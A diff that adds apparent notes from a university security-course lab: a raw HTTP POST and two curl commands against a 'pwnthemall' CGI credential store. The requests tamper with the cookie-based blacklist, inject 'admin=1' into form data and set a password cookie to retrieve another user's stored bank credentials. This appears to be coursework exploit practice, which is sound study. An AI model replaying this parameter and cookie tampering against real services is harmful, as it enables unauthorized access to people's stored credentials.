@@ -1,0 +1,42 @@
+POST /cgi-bin/store HTTP/1.1
+Host: pwnthemall.cse543.rev.fish:8085
+Content-Length: 69
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://pwnthemall.cse543.rev.fish:8085
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://pwnthemall.cse543.rev.fish:8085/9b87ecb29600dd01b9e32d2cd268a9a4
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+Cookie: blacklist=retrieve
+
+id=twebst10&site=www.bank.com&username=twebst10&password=pass&admin=1
+
+curl 'http://pwnthemall.cse543.rev.fish:8085/cgi-bin/store' \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+  -H 'Accept-Language: en-US,en;q=0.9' \
+  -H 'Cache-Control: max-age=0' \
+  -H 'Connection: keep-alive' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'Cookie: PHPSESSID=ub50a547qt5r9fj8rmvrgc95r9; blacklist=store' \
+  -H 'Origin: http://pwnthemall.cse543.rev.fish:8085' \
+  -H 'Referer: http://pwnthemall.cse543.rev.fish:8085/9b87ecb29600dd01b9e32d2cd268a9a4' \
+  --data-raw 'id=twebst10&site=www.bank.com&username=twebst10&password=pass&admin=1' \
+  --compressed \
+  --insecure
+
+  curl 'http://pwnthemall.cse543.rev.fish:8085/cgi-bin/retrieve' \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+  -H 'Accept-Language: en-US,en;q=0.9' \
+  -H 'Cache-Control: max-age=0' \
+  -H 'Connection: keep-alive' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+ -H 'Cookie: PHPSESSID=ub50a547qt5r9fj8rmvrgc95r9; site=www.bank.com; password=terriblechoice' \
+    -H 'Origin: http://pwnthemall.cse543.rev.fish:8085' \
+    -H 'Referer: http://pwnthemall.cse543.rev.fish:8085/9b87ecb29600dd01b9e32d2cd268a9a4' \
+  --data-raw 'id=1&site=www.bank.com&admin=1' \
+  --compressed \
+  --insecure
